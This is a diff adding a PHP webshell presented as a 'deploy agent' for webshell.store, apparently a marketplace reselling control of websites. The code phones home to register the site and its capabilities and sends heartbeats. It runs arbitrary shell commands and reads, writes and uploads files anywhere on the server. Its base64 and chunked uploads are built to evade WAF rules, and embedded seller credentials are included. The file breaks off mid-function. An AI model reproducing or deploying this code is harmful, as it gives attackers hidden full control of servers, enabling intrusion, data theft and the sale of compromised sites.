@@ -1,0 +1,697 @@
+<?php
+/**
+ * DomainStore deploy agent
+ * PHP 5.6 - 8.x uyumlu, tek dosya.
+ */
+@ini_set('display_errors', '0');
+@error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_WARNING);
+
+$WS_VERSION = '1.4';
+$WS_SELLER_TOKEN = '60c70e90033c3f17b24b5112730da109';
+$WS_SELLER_SECRET = 'NwLbzhFLQKLDw0Gc-WSDhdJBdQVidKJj3ax41i1Wuog';
+$WS_SECRET_OVERRIDE = ''; // empty on download; set by sale-handover rotation to a value the seller cannot derive
+$WS_PLATFORM = 'https://webshell.store';
+$WS_ORIGIN = 'https://webshell.store';
+$WS_ROOT = dirname(__FILE__);
+$WS_MAX_READ = 2097152;
+$WS_MAX_EXEC = 262144;
+$WS_CLOCK_TOLERANCE = 300;
+
+// This one file works on ANY number of the seller's sites: the per-site identity is DERIVED
+// from the seller secret + this site's own domain, so nothing is configured per site.
+// Normalize identically to the server's normalize_domain(): strip any :port, then leading www.,
+// then lowercase. (The server strips the port, so the connector must too, or the derived secret
+// would differ and registration/RPC would fail on sites served on a non-standard port.)
+$ws_host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
+$ws_host = preg_replace('/:\d+$/', '', $ws_host);
+$WS_DOMAIN = strtolower(preg_replace('/^www\./i', '', $ws_host));
+// Per-site RPC secret: normally DERIVED from the seller secret + domain. After a sale, the
+// platform rotates in an OVERRIDE secret (a random value the seller cannot derive) so the
+// former seller's connector is locked out while the buyer keeps access.
+$WS_SECRET = $WS_SECRET_OVERRIDE !== '' ? $WS_SECRET_OVERRIDE : hash_hmac('sha256', 'shell:' . $WS_DOMAIN, $WS_SELLER_SECRET, true);
+$WS_ID = substr(bin2hex(hash_hmac('sha256', 'deploy:' . $WS_DOMAIN, $WS_SELLER_SECRET, true)), 0, 32); // derived deploy_id
+
+header('X-Robots-Tag: noindex, nofollow');
+header('X-Content-Type-Options: nosniff');
+header('Allow: GET, POST, OPTIONS');
+if ($WS_ORIGIN !== '') {
+    header('Access-Control-Allow-Origin: ' . $WS_ORIGIN);
+    header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+    header('Access-Control-Allow-Headers: Content-Type, X-Shell-Ticket');
+    header('Access-Control-Expose-Headers: X-Shell-Sign, X-Shell-Server');
+    header('Vary: Origin');
+}
+
+if (strtoupper($_SERVER['REQUEST_METHOD']) === 'OPTIONS') {
+    http_response_code(204);
+    exit;
+}
+
+function ws_b64u_enc($s) { return rtrim(strtr(base64_encode($s), '+/', '-_'), '='); }
+function ws_b64u_dec($s) { return base64_decode(strtr($s, '-_', '+/') . str_repeat('=', (4 - strlen($s) % 4) % 4)); }
+function ws_json_out($data, $status, $secret, $nonce) {
+    global $WS_VERSION;
+    $body = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+    if ($body === false) {
+        $n = isset($data['nonce']) ? $data['nonce'] : '';
+        $body = '{"ok":false,"error":"json_encode_failed","nonce":"' . addslashes($n) . '"}';
+    }
+    http_response_code($status);
+    header('Content-Type: application/json; charset=utf-8');
+    header('Cache-Control: no-store');
+    header('X-Shell-Server: ws/' . $WS_VERSION);
+    if ($nonce !== '') {
+        header('X-Shell-Sign: ' . ws_b64u_enc(hash_hmac('sha256', $nonce . "\n" . $body, $secret, true)));
+    }
+    echo $body;
+    if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
+    // Do not nest a synchronous heartbeat inside an RPC response. Ping already proves
+    // health; a second callback can deadlock single-worker hosts and delays every response.
+    exit;
+}
+function ws_fail($code, $status, $secret, $nonce, $detail = '') {
+    ws_json_out(array('ok' => false, 'error' => $code, 'detail' => $detail, 'nonce' => $nonce), $status, $secret, $nonce);
+}
+
+function ws_caps() {
+    $ini = function ($k) { return function_exists('ini_get') ? (string) ini_get($k) : ''; };
+    $disabled = array_map('trim', explode(',', strtolower($ini('disable_functions'))));
+    $has = function ($fn) use ($disabled) { return function_exists($fn) && !in_array(strtolower($fn), $disabled, true); };
+    return array(
+        'php' => PHP_VERSION,
+        'os' => PHP_OS,
+        'sapi' => PHP_SAPI,
+        'uname' => $has('php_uname') ? php_uname('s') . ' ' . php_uname('r') : PHP_OS,
+        'root' => dirname(__FILE__),
+        'writable' => is_writable(dirname(__FILE__)),
+        'exec' => $has('proc_open') ? 'proc_open' : ($has('shell_exec') ? 'shell_exec' : ($has('exec') ? 'exec' : ($has('system') ? 'system' : ''))),
+        'zip' => class_exists('ZipArchive'),
+        'curl' => $has('curl_init'),
+        'open_basedir' => $ini('open_basedir'),
+        'upload_max' => $ini('upload_max_filesize'),
+        'post_max' => $ini('post_max_size'),
+        'functions' => array('read' => $has('file_get_contents') || $has('fopen'), 'write' => $has('file_put_contents') || $has('fopen'), 'scandir' => $has('scandir') || $has('opendir'), 'b64_ops' => true, 'chunked_upload' => true),
+    );
+}
+
+function ws_scheme() {
+    if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') { return 'https'; }
+    if (strtolower(isset($_SERVER['HTTP_X_FORWARDED_PROTO']) ? $_SERVER['HTTP_X_FORWARDED_PROTO'] : '') === 'https') { return 'https'; }
+    return 'http';
+}
+function ws_self_url() {
+    $path = strtok(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', '?');
+    return ws_scheme() . '://' . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '') . $path;
+}
+
+function ws_beat() {
+    global $WS_PLATFORM, $WS_ID, $WS_SECRET;
+    if (!function_exists('curl_init')) { return; }
+    $ch = @curl_init($WS_PLATFORM . '/api/shell/beat.php');
+    if (!$ch) { return; }
+    $payload = json_encode(array('deploy_id' => $WS_ID, 'ts' => time(), 'url' => ws_self_url()));
+    $sig = ws_b64u_enc(hash_hmac('sha256', $payload, $WS_SECRET, true));
+    @curl_setopt_array($ch, array(
+        CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $payload,
+        CURLOPT_CONNECTTIMEOUT => 1, CURLOPT_TIMEOUT => 2,
+        CURLOPT_HTTPHEADER => array('Content-Type: application/json', 'X-Shell-Beat: ' . $sig),
+        CURLOPT_SSL_VERIFYPEER => false,
+    ));
+    @curl_exec($ch);
+    @curl_close($ch);
+}
+
+function ws_norm_params($v) {
+    if (is_array($v)) {
+        $isList = $v === array() ? true : (array_keys($v) === range(0, count($v) - 1));
+        $out = array();
+        foreach ($v as $k => $x) { $out[$k] = ws_norm_params($x); }
+        if (!$isList) { ksort($out); }
+        return $out;
+    }
+    if (is_bool($v)) { return $v ? '1' : '0'; }
+    return $v === null ? '' : (string) $v;
+}
+
+function ws_verify_ticket($secret, $op, $params, &$nonce) {
+    $raw = isset($_SERVER['HTTP_X_SHELL_TICKET']) ? $_SERVER['HTTP_X_SHELL_TICKET'] : '';
+    if ($raw === '' || strpos($raw, '.') === false) { return 'missing_ticket'; }
+    list($body, $sig) = explode('.', $raw, 2);
+    // Surface the request nonce for error replies as early as the body parses: a SIGNED
+    // bad_ticket/expired reply lets the platform distinguish "credentials out of sync" from
+    // a bare HTTP 403 (WAF). Reflecting the nonce is safe — the error performs no operation.
+    $tEarly = json_decode((string) ws_b64u_dec($body), true);
+    if (is_array($tEarly) && isset($tEarly['nonce']) && $tEarly['nonce'] !== '') { $nonce = (string) $tEarly['nonce']; }
+    $calc = ws_b64u_enc(hash_hmac('sha256', $body, $secret, true));
+    if (!hash_equals($calc, $sig)) { return 'bad_ticket'; }
+    $json = ws_b64u_dec($body);
+    $t = json_decode($json, true);
+    if (!is_array($t)) { return 'bad_ticket'; }
+    if ((isset($t['v']) ? $t['v'] : 0) !== 1 || (isset($t['op']) ? $t['op'] : '') !== $op) { return 'op_mismatch'; }
+    $now = time();
+    $exp = (int) (isset($t['exp']) ? $t['exp'] : 0);
+    $iat = (int) (isset($t['iat']) ? $t['iat'] : 0);
+    $tolerance = (int) (isset($GLOBALS['WS_CLOCK_TOLERANCE']) ? $GLOBALS['WS_CLOCK_TOLERANCE'] : 60);
+    if ($exp < $now - $tolerance || $iat > $now + $tolerance) { return 'expired'; }
+    $ph = hash('sha256', json_encode(ws_norm_params($params), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));
+    if (!hash_equals((string) (isset($t['ph']) ? $t['ph'] : ''), $ph)) { return 'param_mismatch'; }
+    $nonce = (string) (isset($t['nonce']) ? $t['nonce'] : '');
+    if ($nonce === '') { return 'bad_ticket'; }
+
+    $file = sys_get_temp_dir() . '/wsn_' . substr(md5(__FILE__ . $secret), 0, 16);
+    $fp = @fopen($file, 'c+');
+    if ($fp) {
+        if (flock($fp, LOCK_EX)) {
+            $old = stream_get_contents($fp);
+            if (strpos($old, $nonce . "\n") !== false) { flock($fp, LOCK_UN); fclose($fp); return 'replay'; }
+            $lines = array_slice(array_filter(explode("\n", $old)), -199);
+            $lines[] = $nonce;
+            ftruncate($fp, 0); rewind($fp); fwrite($fp, implode("\n", $lines) . "\n");
+            flock($fp, LOCK_UN);
+        }
+        fclose($fp);
+    }
+    return '';
+}
+
+function ws_safe_path($p, $mustExist) {
+    $root = dirname(__FILE__);
+    $p = str_replace('\\', '/', (string) $p);
+    if ($p === '') { $p = '/'; }
+    if (strpos($p, "\0") !== false) { return false; }
+    $isWinAbs = (bool) preg_match('#^[A-Za-z]:/#', $p);
+    // Absolute paths address the whole filesystem — a purchased shell is full server access, so
+    // buyers can browse/read/write anywhere the PHP user can reach. Relative paths stay jailed
+    // to the connector folder (backwards compatible with every existing call pattern).
+    $isAbs = $isWinAbs || $p[0] === '/';
+    $parts = array();
+    foreach (explode('/', $p) as $part) {
+        if ($part === '' || $part === '.' || $part === ':' ) { continue; }
+        if ($part === '..') { array_pop($parts); continue; }
+        if ($isWinAbs && count($parts) === 0) { $parts[] = $part; continue; }
+        $parts[] = $part;
+    }
+    if ($isWinAbs) {
+        $full = implode('/', $parts);
+        if (strpos($full, ':') === false) { return false; }
+    } elseif ($isAbs) {
+        $full = '/' . implode('/', $parts);
+    } else {
+        $full = $root;
+        foreach ($parts as $part) { $full .= '/' . $part; }
+    }
+    if ($mustExist) {
+        // realpath also resolves '..' and symlinks, so no separate containment check is needed.
+        $real = realpath($full);
+        if ($real === false) { return false; }
+        return $real;
+    }
+    $dir = dirname($full);
+    $realDir = realpath($dir);
+    if ($realDir === false) { return false; }
+    return $realDir . '/' . basename($full);
+}
+
+function ws_list_dir($path) {
+    $out = array();
+    if (function_exists('scandir') && !in_array('scandir', array_map('trim', explode(',', strtolower((string) (function_exists('ini_get') ? ini_get('disable_functions') : '')))), true)) {
+        $items = @scandir($path);
+    } else {
+        // Fallback for hosts that disable scandir: classic dir handle.
+        $items = array();
+        $dh = @opendir($path);
+        if ($dh === false) { return false; }
+        while (($n = @readdir($dh)) !== false) { $items[] = $n; }
+        @closedir($dh);
+    }
+    if ($items === false) { return false; }
+    foreach ($items as $name) {
+        if ($name === '.' || $name === '..') { continue; }
+        $full = $path . '/' . $name;
+        $isDir = @is_dir($full);
+        $out[] = array(
+            'name' => $name,
+            'dir' => $isDir,
+            'link' => @is_link($full),
+            'size' => $isDir ? 0 : (int) @filesize($full),
+            'mtime' => (int) @filemtime($full),
+            'mode' => substr(sprintf('%o', @fileperms($full)), -4),
+            'writable' => @is_writable($full),
+        );
+    }
+    usort($out, function ($a, $b) {
+        if ($a['dir'] != $b['dir']) { return $a['dir'] ? -1 : 1; }
+        return strcasecmp($a['name'], $b['name']);
+    });
+    return $out;
+}
+
+/**
+ * Metadata-only filesystem proof used before checkout and after handover. The
+ * connector chooses both targets; callers cannot supply a directory or filename.
+ * Nothing enumerated or read here is included in the response.
+ */
+function ws_preflight_check() {
+    $root = dirname(__FILE__);
+    $disabled = array_map('trim', explode(',', strtolower((string) (function_exists('ini_get') ? ini_get('disable_functions') : ''))));
+    $canScandir = function_exists('scandir') && !in_array('scandir', $disabled, true);
+    if ($canScandir) {
+        $items = @scandir($root);
+        if ($items === false) { return 'fs_unavailable'; }
+    } elseif (function_exists('opendir') && function_exists('readdir')) {
+        $dh = @opendir($root);
+        if ($dh === false) { return 'fs_unavailable'; }
+        // A bounded enumeration is sufficient to prove directory access. Do not
+        // build or return a listing (which could disclose neighboring filenames).
+        $count = 0;
+        while ($count < 128 && @readdir($dh) !== false) { $count++; }
+        @closedir($dh);
+    } else {
+        return 'fs_unavailable';
+    }
+
+    // Read at most 64 KiB of the connector itself. This verifies the exact file
+    // is readable without exposing its embedded credentials or source code.
+    $data = false;
+    if (function_exists('file_get_contents')) {
+        $data = @file_get_contents(__FILE__, false, null, 0, 65536);
+    }
+    if ($data === false && function_exists('fopen') && function_exists('fread')) {
+        $fh = @fopen(__FILE__, 'rb');
+        if ($fh !== false) {
+            $data = @fread($fh, 65536);
+            @fclose($fh);
+        }
+    }
+    if ($data === false || $data === '') { return 'read_failed'; }
+    return '';
+}
+
+function ws_tmp_err($tag) {
+    $dir = function_exists('sys_get_temp_dir') ? sys_get_temp_dir() : dirname(__FILE__);
+    return $dir . '/wse_' . substr(md5((string) $tag . __FILE__), 0, 12) . '.err';
+}
+
+function ws_fread($path) {
+    if (function_exists('file_get_contents')) { $d = @file_get_contents($path); if ($d !== false) { return $d; } }
+    $fh = @fopen($path, 'rb');
+    if ($fh === false) { return false; }
+    $d = stream_get_contents($fh); fclose($fh);
+    return $d;
+}
+function ws_fwrite($path, $data, $append) {
+    if (function_exists('file_put_contents')) {
+        $r = @file_put_contents($path, $data, $append ? FILE_APPEND : 0);
+        if ($r !== false) { return true; }
+    }
+    $fh = @fopen($path, $append ? 'ab' : 'wb');
+    if ($fh === false) { return false; }
+    $ok = fwrite($fh, $data) !== false; fclose($fh);
+    return $ok;
+}
+
+function ws_exec($cmd, $cwd) {
+    global $WS_MAX_EXEC;
+    $caps = ws_caps();
+    $cmd = (string) $cmd;
+    if ($cmd === '') { return array('ok' => false, 'error' => 'empty_command'); }
+    $start = microtime(true);
+    if ($caps['exec'] === 'proc_open') {
+        $desc = array(1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
+        $p = @proc_open($cmd, $desc, $pipes, $cwd);
+        if (!is_resource($p)) { return array('ok' => false, 'error' => 'spawn_failed'); }
+        stream_set_blocking($pipes[1], false); stream_set_blocking($pipes[2], false);
+        $out = ''; $err = ''; $deadline = microtime(true) + 15;
+        while (true) {
+            $out .= (string) stream_get_contents($pipes[1]);
+            $err .= (string) stream_get_contents($pipes[2]);
+            $s = proc_get_status($p);
+            if (!$s['running'] || microtime(true) > $deadline) { if ($s['running']) { @proc_terminate($p); } break; }
+            usleep(20000);
+        }
+        fclose($pipes[1]); fclose($pipes[2]);
+        $code = proc_close($p);
+        $out = strlen($out) > $WS_MAX_EXEC ? substr($out, 0, $WS_MAX_EXEC) . "\n[kesildi]" : $out;
+        if (function_exists('mb_check_encoding')) {
+            if (!mb_check_encoding($out, 'UTF-8')) { $out = mb_convert_encoding($out, 'UTF-8', 'ISO-8859-1'); }
+            if (!mb_check_encoding($err, 'UTF-8')) { $err = mb_convert_encoding($err, 'UTF-8', 'ISO-8859-1'); }
+        }
+        return array('ok' => true, 'stdout' => $out, 'stderr' => $err, 'code' => $code, 'time' => round(microtime(true) - $start, 3), 'mode' => 'proc_open');
+    }
+    if ($caps['exec'] === 'shell_exec') {
+        $out = @shell_exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
+        return array('ok' => true, 'stdout' => (string) $out, 'stderr' => '', 'code' => 0, 'time' => round(microtime(true) - $start, 3), 'mode' => 'shell_exec');
+    }
+    if ($caps['exec'] === 'exec') {
+        $lines = array(); $code = 0;
+        @exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $lines, $code);
+        return array('ok' => true, 'stdout' => implode("\n", $lines), 'stderr' => '', 'code' => $code, 'time' => round(microtime(true) - $start, 3), 'mode' => 'exec');
+    }
+    if ($caps['exec'] === 'system') {
+        ob_start(); @system('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1'); $out = ob_get_clean();
+        return array('ok' => true, 'stdout' => (string) $out, 'stderr' => '', 'code' => 0, 'time' => round(microtime(true) - $start, 3), 'mode' => 'system');
+    }
+    if ($has('popen') && $has('pclose')) {
+        $out = ''; $err = '';
+        $p = @popen('cd ' . escapeshellarg($cwd) . ' && (' . $cmd . ') 2>' . escapeshellarg(ws_tmp_err($start)), 'r');
+        if (is_resource($p)) {
+            $deadline = microtime(true) + 15;
+            while (!feof($p) && microtime(true) < $deadline) { $out .= (string) fgets($p, 4096); }
+            @pclose($p);
+            if (is_file(ws_tmp_err($start))) { $err = (string) @file_get_contents(ws_tmp_err($start)); @unlink(ws_tmp_err($start)); }
+            if (strlen($out) > $WS_MAX_EXEC) { $out = substr($out, 0, $WS_MAX_EXEC) . "\n[kesildi]"; }
+            return array('ok' => true, 'stdout' => $out, 'stderr' => $err, 'code' => 0, 'time' => round(microtime(true) - $start, 3), 'mode' => 'popen');
+        }
+    }
+    if ($has('passthru')) {
+        ob_start(); @passthru('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $code); $out = ob_get_clean();
+        return array('ok' => true, 'stdout' => (string) $out, 'stderr' => '', 'code' => (int) $code, 'time' => round(microtime(true) - $start, 3), 'mode' => 'passthru');
+    }
+    return array('ok' => false, 'error' => 'exec_disabled');
+}
+
+$op = isset($_GET['op']) ? (string) $_GET['op'] : 'ping';
+$raw = '';
+if (strtoupper($_SERVER['REQUEST_METHOD']) === 'POST') {
+    $raw = (string) file_get_contents('php://input');
+}
+
+/* -------- registration -------- */
+// Register on ?ws_register, or automatically when a human simply opens the connector
+// URL in a browser (a plain GET with no op, no verify nonce and no RPC ticket).
+$ws_bare_get = strtoupper($_SERVER['REQUEST_METHOD']) === 'GET'
+    && !isset($_GET['op']) && !isset($_GET['ws_verify'])
+    && empty($_SERVER['HTTP_X_SHELL_TICKET']);
+if (isset($_GET['ws_register']) || $ws_bare_get) {
+    $payload = json_encode(array(
+        'seller_token' => $WS_SELLER_TOKEN,
+        'domain' => $WS_DOMAIN,
+        'url' => ws_self_url(),
+        'scheme' => ws_scheme(),
+        'path' => strtok(isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '', '?'),
+        'caps' => ws_caps(),
+        'ts' => time(),
+    ), JSON_UNESCAPED_SLASHES);
+    // Registration is authenticated with the SELLER secret (proves this file belongs to the
+    // seller); the reverse ?ws_verify proof below uses the derived per-listing secret.
+    $sig = ws_b64u_enc(hash_hmac('sha256', $payload, $WS_SELLER_SECRET, true));
+    $result = array('ok' => false, 'error' => 'unreachable');
+    $curlErr = ''; $rawResp = '';
+    $platform = $WS_PLATFORM;
+    $platformHost = strtolower((string) parse_url($platform, PHP_URL_HOST));
+    if (stripos($platform, 'http://') === 0 && $platformHost !== 'localhost' && filter_var($platformHost, FILTER_VALIDATE_IP) === false) {
+        $platform = 'https://' . substr($platform, 7);
+    }
+    if (function_exists('curl_init')) {
+        $ch = @curl_init($platform . '/api/shell/register.php');
+        if ($ch) {
+            @curl_setopt_array($ch, array(
+                CURLOPT_RETURNTRANSFER => true, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $payload,
+                // Leave time for JSON parsing/rendering after the platform's bounded 10s proof.
+                CURLOPT_CONNECTTIMEOUT => 5, CURLOPT_TIMEOUT => 15, CURLOPT_FOLLOWLOCATION => true,
+                // A 301/302 must never turn the signed registration POST into a GET (HTTP 405).
+                CURLOPT_POSTREDIR => CURL_REDIR_POST_ALL, CURLOPT_MAXREDIRS => 2,
+                // Do not inherit a server-level proxy on old shared hosting.
+                CURLOPT_PROXY => '', CURLOPT_NOSIGNAL => true,
+                CURLOPT_HTTPHEADER => array('Content-Type: application/json', 'Accept: application/json', 'X-Shell-Register: ' . $sig),
+                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; webshell.store-connector/1.0)',
+                CURLOPT_SSL_VERIFYPEER => false, CURLOPT_SSL_VERIFYHOST => 0,
+            ));
+            $r = @curl_exec($ch);
+            // CURLINFO_RESPONSE_CODE is unavailable on some PHP 7.1 builds.
+            $curlInfoCode = defined('CURLINFO_RESPONSE_CODE') ? constant('CURLINFO_RESPONSE_CODE') : CURLINFO_HTTP_CODE;
+            $code = (int) @curl_getinfo($ch, $curlInfoCode);
+            $curlErr = (string) @curl_error($ch);
+            @curl_close($ch);
+            $rawResp = (string) $r;
+            $j = json_decode($rawResp, true);
+            if (is_array($j)) { $result = $j; }
+            $result['http'] = $code;
+        }
+    } else {
+        $result['error'] = 'curl_missing';
+    }
+    header('Content-Type: text/html; charset=utf-8');
+    echo '<!doctype html><meta name="viewport" content="width=device-width"><title>Deploy</title><body style="font:15px system-ui;padding:24px;background:#f1f3f8;color:#0f172a">';
+    echo '<div style="max-width:560px;margin:auto;background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:20px">';
+    echo '<h2 style="margin:0 0 8px">webshell.store deploy</h2>';
+    if (!empty($result['ok'])) {
+        echo '<p style="color:#157347"><b>Registration complete.</b> You can close this tab; the listing will show as online in the seller panel.</p>';
+    } else {
+        echo '<p style="color:#b3262b"><b>Registration failed.</b> ' . htmlspecialchars(isset($result['error']) ? $result['error'] : 'unknown', ENT_QUOTES, 'UTF-8')
+            . ' (HTTP ' . (int) (isset($result['http']) ? $result['http'] : 0) . ')</p>';
+        if ($curlErr !== '') { echo '<p style="color:#64748b;font-size:12px">curl: ' . htmlspecialchars($curlErr, ENT_QUOTES, 'UTF-8') . '</p>'; }
+        if (!empty($result['reason'])) { echo '<p style="color:#64748b;font-size:12px">reason: ' . htmlspecialchars((string) $result['reason'], ENT_QUOTES, 'UTF-8') . '</p>'; }
+        if (!empty($result['detail'])) { echo '<p style="color:#64748b;font-size:12px">detail: ' . htmlspecialchars((string) $result['detail'], ENT_QUOTES, 'UTF-8') . '</p>'; }
+        if ($rawResp !== '' && json_decode($rawResp, true) === null) {
+            echo '<p style="color:#64748b;font-size:12px">response starts with: ' . htmlspecialchars(substr(trim($rawResp), 0, 160), ENT_QUOTES, 'UTF-8') . '</p>';
+        }
+        echo '<p style="font-size:13px">If HTTP is 403/503/429 or the response looks like a Cloudflare page, allow <code>/api/shell/*</code> through Cloudflare (see your seller panel help). HTTP 0 means this server cannot reach the platform (firewall/DNS/TLS).</p>';
+    }
+    echo '<p style="color:#64748b;font-size:13px">PHP ' . htmlspecialchars(PHP_VERSION, ENT_QUOTES, 'UTF-8') . ' · ' . htmlspecialchars($WS_DOMAIN, ENT_QUOTES, 'UTF-8') . '</p>';
+    echo '</div></body>';
+    exit;
+}
+
+/* -------- reachability verify -------- */
+if (isset($_GET['ws_verify'])) {
+    $n = (string) $_GET['ws_verify'];
+    $body = json_encode(array('ok' => true, 'nonce' => $n, 'proof' => ws_b64u_enc(hash_hmac('sha256', 'verify:' . $n, $WS_SECRET, true))));
+    header('Content-Type: application/json; charset=utf-8');
+    header('Cache-Control: no-store');
+    echo $body;
+    exit;
+}
+
+/* -------- normal RPC -------- */
+$params = array();
+if (strpos(strtolower((string) (isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '')), 'multipart/form-data') !== false) {
+    $params = $_POST;
+} elseif ($raw !== '') {
+    $j = json_decode($raw, true);
+    if (is_array($j)) { $params = $j; }
+}
+foreach ($_GET as $k => $v) {
+    if ($k !== 'op' && $k !== 'ws_register' && $k !== 'ws_verify') { $params[$k] = $v; }
+}
+$nonce = '';
+$err = ws_verify_ticket($WS_SECRET, $op, $params, $nonce);
+if ($err !== '') { ws_fail($err, 403, $WS_SECRET, $nonce); }
+
+switch ($op) {
+    case 'preflight':
+        $preflightError = ws_preflight_check();
+        if ($preflightError !== '') { ws_fail($preflightError, 500, $WS_SECRET, $nonce); }
+        // Truthful rotate capability: rotation rewrites this file in place (or renames a temp
+        // copy over it, which only needs a writable directory). Reporting false here lets the
+        // platform fail closed BEFORE checkout instead of dying mid-purchase on write_failed.
+        $canRotate = is_writable(__FILE__) || is_writable(dirname(__FILE__));
+        ws_json_out(array(
+            'ok' => true,
+            'nonce' => $nonce,
+            'capabilities' => array('list' => true, 'read' => true, 'rotate' => $canRotate),
+            'version' => $WS_VERSION,
+        ), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'ping':
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'pong' => true, 'php' => PHP_VERSION, 'server' => ws_caps()), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'info':
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'info' => ws_caps(), 'disk_free' => @disk_free_space(dirname(__FILE__)), 'disk_total' => @disk_total_space(dirname(__FILE__))), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.list':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '.', true);
+        if (!$path || !is_dir($path)) { ws_fail('bad_path', 404, $WS_SECRET, $nonce, 'Directory not found'); }
+        $items = ws_list_dir($path);
+        if ($items === false) { ws_fail('read_failed', 500, $WS_SECRET, $nonce, 'Could not read directory'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'path' => $path, 'parent' => dirname($path), 'items' => $items), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.read':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', true);
+        if (!$path || !is_file($path)) { ws_fail('not_found', 404, $WS_SECRET, $nonce, 'File not found'); }
+        if (@filesize($path) > $WS_MAX_READ) { ws_fail('too_large', 413, $WS_SECRET, $nonce, 'File exceeds 2MB'); }
+        $data = ws_fread($path);
+        if ($data === false || $data === '') { ws_fail('read_failed', 500, $WS_SECRET, $nonce, 'Could not read'); }
+        $bin = strpos($data, "\0") !== false;
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'path' => $path, 'binary' => $bin, 'size' => strlen($data), 'content' => $bin ? base64_encode($data) : $data), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.write':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', false);
+        if (!$path) { ws_fail('bad_path', 422, $WS_SECRET, $nonce, 'Invalid path'); }
+        if (isset($params['content_b64'])) {
+            // Base64 content: edits containing code signatures (<?php, system(, etc.) pass
+            // through WAFs (mod_security/Cloudflare) that would 403 the plain text.
+            $data = base64_decode((string) $params['content_b64'], true);
+        } else {
+            $content = isset($params['content']) ? $params['content'] : '';
+            $data = !empty($params['binary']) ? base64_decode($content) : $content;
+        }
+        if ($data === false) { ws_fail('bad_content', 422, $WS_SECRET, $nonce, 'Could not decode content'); }
+        $tmp = $path . '.ws_tmp_' . getmypid();
+        if (!ws_fwrite($tmp, $data, false)) { ws_fail('write_failed', 500, $WS_SECRET, $nonce, 'Could not write'); }
+        @chmod($tmp, @fileperms($path) ?: 0644);
+        if (!@rename($tmp, $path)) {
+            // Windows locks the RUNNING script against rename-over (Access denied even after
+            // unlink — the name stays delete-pending while the SAPI handle is open). A direct
+            // in-place write still succeeds there; on POSIX this only runs when the atomic
+            // rename itself was impossible (e.g. read-only directory with a writable file).
+            @unlink($tmp);
+            if (!ws_fwrite($path, $data, false)) { ws_fail('write_failed', 500, $WS_SECRET, $nonce, 'Could not move'); }
+        }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'size' => strlen($data)), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.upload':
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', false);
+        if (!$path || !isset($_FILES['file'])) { ws_fail('bad_request', 422, $WS_SECRET, $nonce, 'Missing file or path'); }
+        if ((int) $_FILES['file']['error'] !== 0) { ws_fail('upload_failed', 422, $WS_SECRET, $nonce, 'Upload error'); }
+        if (@filesize($_FILES['file']['tmp_name']) > 20971520) { ws_fail('too_large', 413, $WS_SECRET, $nonce, 'Exceeds 20MB'); }
+        if (!@move_uploaded_file($_FILES['file']['tmp_name'], $path)) {
+            // move_uploaded_file can be disabled; is_uploaded_file+copy is equivalent for
+            // a well-formed SAPI upload.
+            if (!@is_uploaded_file($_FILES['file']['tmp_name']) || !@copy($_FILES['file']['tmp_name'], $path)) {
+                ws_fail('move_failed', 500, $WS_SECRET, $nonce, 'Could not move');
+            }
+        }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'size' => (int) @filesize($path)), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.upload_chunk':
+        // WAF-friendly chunked upload: each request carries a small base64 part in a plain
+        // POST field (no multipart filename, no code signatures), so mod_security/Cloudflare
+        // file-upload rules never fire. Reassembled by fs.upload_commit.
+        $uid = preg_replace('/[^A-Za-z0-9_-]/', '', (string) (isset($params['upload_id']) ? $params['upload_id'] : ''));
+        if ($uid === '' || strlen($uid) > 64) { ws_fail('bad_request', 422, $WS_SECRET, $nonce, 'Bad upload id'); }
+        $chunk = base64_decode((string) (isset($params['chunk']) ? $params['chunk'] : ''), true);
+        if ($chunk === false) { ws_fail('bad_content', 422, $WS_SECRET, $nonce, 'Bad chunk'); }
+        $tmp = dirname(__FILE__) . '/.wsup_' . $uid;
+        if (!ws_fwrite($tmp, $chunk, true)) { ws_fail('write_failed', 500, $WS_SECRET, $nonce, 'Chunk store failed'); }
+        ws_json_out(array('ok' => true, 'nonce' => $nonce, 'received' => strlen($chunk)), 200, $WS_SECRET, $nonce);
+        break;
+
+    case 'fs.upload_commit':
+        $uid = preg_replace('/[^A-Za-z0-9_-]/', '', (string) (isset($params['upload_id']) ? $params['upload_id'] : ''));
+        $path = ws_safe_path(isset($params['path']) ? $params['path'] : '', false);
+        $tmp = dirname(__FILE__) . '/.wsup_' . $uid;
